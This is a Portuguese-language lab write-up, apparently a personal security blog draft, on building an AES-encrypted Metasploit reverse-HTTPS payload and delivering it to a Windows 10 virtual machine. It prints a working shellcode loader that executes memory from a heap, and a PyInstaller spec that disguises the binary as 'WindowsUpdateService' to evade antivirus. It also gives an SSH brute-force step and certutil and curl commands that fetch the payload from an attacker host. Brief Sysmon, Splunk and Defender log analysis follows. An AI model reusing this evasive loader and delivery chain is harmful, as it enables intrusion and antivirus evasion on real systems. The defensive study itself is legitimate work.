# 🛡️ [TÍTULO DO ARTIGO AQUI]
> *Exemplo: Detectando Injeção de DLL com Sysmon e Splunk*

## 📌 Resumo
Neste eu criei um shellcode usando metasploit e apliquei algumas tecnicas de obfuscacao e encryptacao com o objetivo de passar pela seguranca de uma 
virtual machine e observar a reacao do sistema de defesa e os logs gerados por splunk e sysmon infelizmente (ou felizmente) o malware foi detectado pelo sistema windows 
assim que foi baixado, entretanto todo o processo de criacao e execucao geraram muito conhecimento pratico que eu vou registrar aqui.  

---

## 📌 AVISO 

AVISO LEGAL: Este artigo é apenas para fins educacionais. Todas as atividades foram realizadas em ambientes isolados e controlados. 
Nunca execute essas técnicas em sistemas que você não possui ou não tem autorização explícita. O uso indevido dessas informações é de responsabilidade exclusiva do leitor.


## ⚙️ Ambiente de Testes

| Componente     | Detalhes                                          |
|----------------|---------------------------------------------------|
| Atacante       | Kali Linux                                        |
| Alvo           | Windows 10                                        |
| Ferramentas    | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
| Técnica usada  | Brute Force, reverse shel, LOLbin                 |

---


## 🧪 DETALHES TECNICOS 
 Durante a instalacao do Splunk eu tive alguns problemas para recebecer os logs sysmon no splunk GUI depois de muito procurar eu descobri que 
 era um problema de permissoes do windows, em services na aba log on e necessario que a opcao 'local system account' esteja selecionada, assim como na imagem 

 (PRINT DO PROGRAMA SERVICES/SPLUNK)
 ![Image](https://github.com/user-attachments/assets/6e6b6d0f-1e6f-417a-a815-d30c4effb318)

 Para receber os logs em splunk voce deve colocar este codigo no arquvivo output.conf do splunk caso ainda nao tenha sido configurado
  
  (PRINT DO ARQUIVO DE CONFIGURACAO SPLUNK)
![Image](https://github.com/user-attachments/assets/1c1531f3-a47a-4fe6-825c-bb597b36d014)




## 🧪 SOBRE O MALWARE E OFUSCACAO 
 Para este artigo eu escolhi usar um shellcode metasploist e obfusca-lo com codigo python para este proposito foi escolhido esta opcao 
 

```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```

Este comando vai gerar um shellcode em .raw format pronto para converte-lo em hexadecimal string apos ter gerado o 
shellcode nos usamos este comando para converter o resultado em codigo hexadecimal 

```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```

  Resultado do comando anterior:
   ![Image](https://github.com/user-attachments/assets/4263f989-ef76-4d00-936e-32da016fc588)

  Logo apos eu usei este codigo python para converter a saida do comando anterior em uma versao encryptada usando uma chave AES de 16 bytes (128 bits),
  isso vai ajudar bypass o sistema de defesa do windows tornando mais dificil para o antivirus indentificar o codigo malicioso dentro do executavel:

[PRINT DO VS CODE ENCRYPTACAO]
![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)

Agora nos temos um shellcode pronto para ser inserido no codigo.

# Sobre *VirtualAlloc e HeapAlloc*     

   Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
 pelo o que eu entendi ```xml VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
 e muito usado por sistemas complexos entretanto deixa muito rastros no sistema (```xml xmlVirtualAlloc + WriteProcessMemory + CreateRemoteThread```)
 e por ja ter sido muito usada ja e conhecida por antivirus.
 
 s2  ```xml HeapAlloc``` por outro lado usa um pedaco pequeno da memoria disponivel e e metodo muito usado pela maioria dos programas isso torna essa opcao 
 muito menos suspeita o ponto negativo e que o pedaco de memoria alocado inicialmente nao pode executar o codigo entao e necessario a execucao de outro comando depois ```xml HEAP_CREATE_ENABLE_EXECUTE```
 para liberar a execucao. Como o objetivo e bypass as defesas do windows eu escolhi a segunda opcao.

 **NOTE:** Enquanto escrevia este artigo descobri que a opcao  ```VirtualAlloc + VirtualProtect``` pode ser mais eficiente em bypass o sistema de defesa, vou testar isso em artigos futuros 

 Esse foi o codigo adquirido na internet para descriptografar um shellcode usando AES-CBC, 
 alocar memória executável em uma heap privada no processo atual e executar o shellcode via CreateThread o shellcode encryptografado esta na variavel encrypted_b64:

 ```Python
import base64
import ctypes
from Crypto.Cipher import AES

# === KEY AND IV (must match those used during encryption) ===
key = b'ThisIsA16ByteKey'
iv = b'ThisIsA16ByteIV!'

# === Encrypted shellcode (base64) ===
encrypted_b64 = b"2G8Rv5XtiV6HwQS/DsUBAOQB+pUlMLPJ+KwsV9Ixm8ym6BdI7s5kNf0Qw++2d7qKp3ykcrNXnodX8a"
encrypted = base64.b64decode(encrypted_b64)

# === Decrypt using AES-CBC ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
shellcode = decrypted[:-pad_len]

# === Create a private heap ===
heap = ctypes.windll.kernel32.HeapCreate(0x00040000, len(shellcode), 0)  # HEAP_CREATE_ENABLE_EXECUTE
if not heap:
    raise Exception("HeapCreate failed")

# === Allocate executable memory in the heap ===
ptr = ctypes.windll.kernel32.HeapAlloc(heap, 0x00000008, len(shellcode))  # HEAP_ZERO_MEMORY
if not ptr:
    raise Exception("HeapAlloc failed")

# === Copy shellcode to the heap ===
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

# === Execute the shellcode ===
ht = ctypes.windll.kernel32.CreateThread(
    None,
    0,
    ctypes.c_void_p(ptr),
    None,
    0,
    None
)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
 ```
    
## 🧪 GERANDO UM EXCUTAVEL

Apos ter configurado o codigo foi usado este comando para gerar o executavel usando wine no kali linux

```bash
wine cmd
pyinstaller --noconfirm --onefile malwareobfuscated.py
```
![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)

Este comando retornou um executavel pronto mas tambem um arquivo .spec que podemos usar para alterar algumas caracteristicas do malware para torna-lo mais dificil de ser detectado

**.SPEC FILE** 

```bash
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['malwareobfuscated.py'],
    pathex=['.'],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=2,  # enable bytecode optimization
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='WindowsUpdateService',  # process name — mimics a legitimate system service
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,  # strip debug symbols from executable
    upx=True,  # apply UPX compression to reduce file size
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # hide console window 
    disable_windowed_traceback=True,  # disable error pop-ups on crash
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)

coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=True,
    upx=True,
    name='WindowsUpdateService'
)

```


This build configuration utilizes the PyInstaller .spec file (resulted from the last command)  to generate a standalone Windows executable that mimics a legitimate system process.
The output binary is named WindowsUpdateService.exe, leveraging process masquerading as an evasion technique. The executable is stripped of debug symbols, compressed using UPX, and runs silently without a console window, 
reducing forensic visibility. No external dependencies are bundled, keeping the footprint minimal. 

After configure the .spec file we generate the final executable from the .spec in a same folder of the code:

```bash
wine cmd
pyinstaller --onefile malwareobfuscated.spec
```

![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)

Esse e o resultado final do processo de criacao agora estamos prontos para realizar a entrega do malware:

![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)


## DELIVERING THE PAYLOAD 

Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o malware.
Para realizar a requisicao vamos usar um executavel chamado ```certutil.exe``` que foi criado originalmente para gerenciar certificados digitais entretanto foi muito usado como LOLbin por hackers que nao querem
deixar rastros o uso de certutil ja e bem conhecido pelos sistemas de defesa mas eu quero testar a execucao e o comportamento do sistema de defesa em uma situacao real. 

 ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```


Aqui realizei o brute force e consegui uma senha:

![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)

Logo apos realizei a requisicao usando certutil.exe como LOLbin:

 [CERTUTIL.exe COMMAND]
 
![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)

A principio pensei que o certutil.exe tivesse conseguido baixar o malware e logo apos Windows Defender teria bloqueado a execucao entretanto notei que nao havia 
nenhum aviso de requisicao GET recebida pelo python server(como pode ser visto no screenchot acima) o que me leva a pensar que o sistema bloqueou a requisicao antes de ser feita. 
Para tirar a duvida tentei realizar uma requisicao para um site benigno ```google.com``` usando ```certutil.exe``` mas recebi o mesmo output do windows, procurando nos logs do event viewer encontrei esse registro

🔍 **Microsoft Defender Detection Log**
```
- **Product**: Microsoft Defender Antivirus  
- **Product Version**: 4.18.25040.2  
- **Detection ID**: {5BE40275-E18B-40CA-8D0A-659F906123B2}  
- **Detection Time**: 2025-05-27 15:29:04 UTC  
- **Threat Name**: Trojan:Win32/Ceprolad.A  
- **Severity**: Severe  
- **Category**: Trojan  
- **Detection User**: NT AUTHORITY\SYSTEM  
- **Process Name**: Unknown  
- **Command Line**: `certutil.exe -urlcache -split -f https://google.com`  
- **Path**: C:\Windows\System32\certutil.exe  
- **Action Taken**: Not Applicable (automatically blocked)  
- **Engine Version**: AM: 1.1.25040.1  
- **Signature Version**: AV: 1.429.193.0  
- **Reference**: [Microsoft Threat Info](https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0)
```



 Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as, 
 ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao observa somente o destino das requisicoes mas 
 mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).


Sendo assim decidi executar o delivery de uma forma mais simples atraves de uma requisicao curl 

```curl http://192.168.56.101:7070/WindowsUpdateService```
![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)


 Mesmo com a encryptacao e ofuscacao o windows defender detectou a presenca do malware e o bloqueou porem 
 essa atividade gerou alguns logs interessantes que vamos analisar no proximo capitulo

![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)




---

## 🔍 Coleta e Análise dos Logs

### 📁 Splunk - Configuração
Trecho da config usada (ou link para ela).


*TENTATIVAS DE LOGIN*


*LOGS EM SPLUNK*
![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)
Essa quantidade tentativa de login em tao pouco tempo capturadas pelo splunk acende uma red flag analisando mais 
a fundo nos logs em sysmon encontamos mais uma eveidencia de atividade maliciosa
Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Sysmon registrou o seguinte comportamento:

1. [Creation of Remote Treat]
 ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Entretanto nos ja sabemos que o malware nao foi nem se quer baixado
entao eu acredito que este log foi acionado quando eu solicitei um cmd.exe via ssh, mesmo que nao esteja diretamente relacionado com o malware ainda sim e um artefato importante.

3. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
Pouco após a tentativa download via cetutil.exe, o processo SecurityHealthHost.exe, parte do Windows Defender, foi invocado. Isso sugere que a carga/acao maliciosa foi identificada e bloqueada pela solução nativa do sistema, interrompendo a execução completa do ataque.

4. [IDENTIFICACAO PELO SISTEMA DE DEFESA]
![Image](https://github.com/user-attachments/assets/e1290956-49f1-473f-90bc-caf32dd7de12)

Neste log vemos a identificao pelo Windows Defender da tentativa de LOLbin separei os detalhes mais importantes no prompt abaixo. 

```
Threat Name:      Trojan:Win32/Ceprolad.A  
Severity:         Severe  
Detection Time:   2025-05-27 20:29:56 UTC  
Detected By:      NT AUTHORITY\SYSTEM  
Process Name:     certutil.exe  
Command Line:     certutil.exe -urlcache -split -f https://  
Path:             C:\Windows\System32\certutil.exe  
Action Taken:     Not Applicable 
```



3.[CCONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)

Neste ultimo log nos temos a confirmacao de que a ameca foi removida com sucesso pelo windows defender ```Action Name: Remove```, ``` The operation completed successfully.```

##CONCLUSAO 

Este laboratorio acabou sendo mais Read Team do que Bue Team, apesar de nao ter conseguido executar obfuscar o malware o sulficiente o processo de criacao 
e tecnicas de ofuscacao me deram insight importantes para serem usados em laboratorios futuros. Em relacao a parte defensiva do projeto houveram menos eventos
do que eu esperava, Splunk foi muito util para detectar os eventos de brute force e a ativacao do sistema de defesa mas o que eu acredito ter sido o aprendizado mais importante 
foi o processo de instalao e configuracao do splunk. 





